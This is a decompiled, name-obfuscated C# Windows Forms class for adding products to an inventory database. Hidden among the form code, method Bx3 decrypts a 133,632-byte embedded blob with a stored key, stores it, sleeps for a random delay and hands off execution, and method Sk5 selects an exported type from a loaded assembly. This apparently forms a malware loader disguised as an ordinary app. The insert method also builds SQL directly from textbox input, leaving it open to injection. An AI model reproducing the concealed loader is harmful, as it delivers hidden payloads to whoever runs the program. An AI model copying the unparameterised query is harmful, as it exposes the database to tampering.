using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Rn4;
using Ww0;
using Xb1;
using s5W;

namespace n5C;

[DesignerGenerated]
public class Ye6 : Form
{
	private IContainer components;

	private y2D dataaccess;

	[field: AccessedThroughProperty("lablbla")]
	internal virtual Label lablbla
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("labbale")]
	internal virtual Label labbale
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtLoaisp")]
	internal virtual TextBox txtLoaisp
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtMasp")]
	internal virtual TextBox txtMasp
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtTensp")]
	internal virtual TextBox txtTensp
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtSoluong")]
	internal virtual TextBox txtSoluong
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnOK
	{
		[CompilerGenerated]
		get
		{
			return _btnOK;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Gz7;
			Button val = _btnOK;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnOK = value;
			val = _btnOK;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button btnCanc
	{
		[CompilerGenerated]
		get
		{
			return _btnCanc;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = z3B;
			Button val = _btnCanc;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnCanc = value;
			val = _btnCanc;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	public Ye6()
	{
		((Form)this).add_Load((EventHandler)Hw3);
		dataaccess = new y2D();
		a4G();
	}

	[DebuggerNonUserCode]
	protected override void p1A(bool Xy3)
	{
		try
		{
			if (Xy3 && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Xy3);
		}
	}

	[DebuggerStepThrough]
	private void a4G()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		lablbla = new Label();
		labbale = new Label();
		Label3 = new Label();
		txtLoaisp = new TextBox();
		txtMasp = new TextBox();
		txtTensp = new TextBox();
		Label4 = new Label();
		txtSoluong = new TextBox();
		btnOK = new Button();
		btnCanc = new Button();
		((Control)this).SuspendLayout();
		lablbla.set_AutoSize(true);
		((Control)lablbla).set_Location(new Point(13, 26));
		((Control)lablbla).set_Name("lablbla");
		((Control)lablbla).set_Size(new Size(44, 13));
		((Control)lablbla).set_TabIndex(0);
		lablbla.set_Text("Loai SP");
		labbale.set_AutoSize(true);
		((Control)labbale).set_Location(new Point(13, 71));
		((Control)labbale).set_Name("labbale");
		((Control)labbale).set_Size(new Size(39, 13));
		((Control)labbale).set_TabIndex(1);
		labbale.set_Text("Ma SP");
		Label3.set_AutoSize(true);
		((Control)Label3).set_Location(new Point(13, 119));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(43, 13));
		((Control)Label3).set_TabIndex(2);
		Label3.set_Text("Ten SP");
		((Control)txtLoaisp).set_Location(new Point(72, 23));
		((Control)txtLoaisp).set_Name("txtLoaisp");
		((TextBoxBase)txtLoaisp).set_ReadOnly(true);
		((Control)txtLoaisp).set_Size(new Size(179, 20));
		((Control)txtLoaisp).set_TabIndex(3);
		((Control)txtMasp).set_Location(new Point(72, 68));
		((Control)txtMasp).set_Name("txtMasp");
		((Control)txtMasp).set_Size(new Size(179, 20));
		((Control)txtMasp).set_TabIndex(4);
		((Control)txtTensp).set_Location(new Point(72, 116));
		((Control)txtTensp).set_Name("txtTensp");
		((Control)txtTensp).set_Size(new Size(179, 20));
		((Control)txtTensp).set_TabIndex(5);
		Label4.set_AutoSize(true);
		((Control)Label4).set_Location(new Point(13, 168));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(53, 13));
		((Control)Label4).set_TabIndex(6);
		Label4.set_Text("So Luong");
		((Control)txtSoluong).set_Location(new Point(72, 168));
		((Control)txtSoluong).set_Name("txtSoluong");
		((Control)txtSoluong).set_Size(new Size(179, 20));
		((Control)txtSoluong).set_TabIndex(7);
		((Control)btnOK).set_Location(new Point(48, 207));
		((Control)btnOK).set_Name("btnOK");
		((Control)btnOK).set_Size(new Size(75, 23));
		((Control)btnOK).set_TabIndex(8);
		((ButtonBase)btnOK).set_Text("OK");
		((ButtonBase)btnOK).set_UseVisualStyleBackColor(true);
		((Control)btnCanc).set_Location(new Point(160, 207));
		((Control)btnCanc).set_Name("btnCanc");
		((Control)btnCanc).set_Size(new Size(75, 23));
		((Control)btnCanc).set_TabIndex(9);
		((ButtonBase)btnCanc).set_Text("Cancel");
		((ButtonBase)btnCanc).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 262));
		((Control)this).get_Controls().Add((Control)(object)btnCanc);
		((Control)this).get_Controls().Add((Control)(object)btnOK);
		((Control)this).get_Controls().Add((Control)(object)txtSoluong);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)txtTensp);
		((Control)this).get_Controls().Add((Control)(object)txtMasp);
		((Control)this).get_Controls().Add((Control)(object)txtLoaisp);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)labbale);
		((Control)this).get_Controls().Add((Control)(object)lablbla);
		((Control)this).set_Name("AddSp");
		((Form)this).set_Text("AddSp");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private object Gz8()
	{
		string text = "INSERT INTO SanPham (MaSP,TenSP,SL,MaLSP)";
		text += $"VALUES ('{txtMasp.get_Text()}','{txtTensp.get_Text()}','{txtSoluong.get_Text()}','{txtLoaisp.get_Text()}')";
		return dataaccess.r3Q(text);
	}

	private object Lc9()
	{
		return string.IsNullOrEmpty(txtMasp.get_Text()) || string.IsNullOrEmpty(txtTensp.get_Text()) || string.IsNullOrEmpty(txtSoluong.get_Text()) || string.IsNullOrEmpty(txtLoaisp.get_Text());
	}

	private void Hw3(object sender, EventArgs e)
	{
	}

	internal static void Bx3()
	{
		byte[] array = Xq1.Hx2(133632);
		checked
		{
			int x4Z = Convert.ToInt32(RuntimeHelpers.GetObjectValue(Kb1.mDic[Kb1.sNum])) * 3;
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = Kq4.Dk4(array[i], (byte[])Kb1.mDic[Kb1.sArray], x4Z, i);
			}
			Kb1.mDic.Add(Kb1.mArray, array);
			Task.Delay(new Random().Next(1000, 5000)).Wait();
			y2D.Fe7();
		}
	}

	private void Gz7(object sender, EventArgs e)
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToBoolean(Lc9()))
		{
			MessageBox.Show("Chua nhap gia tri", "Error", (MessageBoxButtons)0);
			return;
		}
		if (Conversions.ToBoolean(Gz8()))
		{
			MessageBox.Show("Them thanh cong", "Success", (MessageBoxButtons)0);
			((Form)this).set_DialogResult((DialogResult)1);
		}
		else
		{
			MessageBox.Show("Them that bai", "Error", (MessageBoxButtons)0);
			((Form)this).set_DialogResult((DialogResult)7);
		}
		((Form)this).Close();
	}

	internal static Type Sk5(Assembly Cr8)
	{
		return Cr8.GetExportedTypes()[27];
	}

	private void z3B(object sender, EventArgs e)
	{
		((Form)this).Close();
	}
}
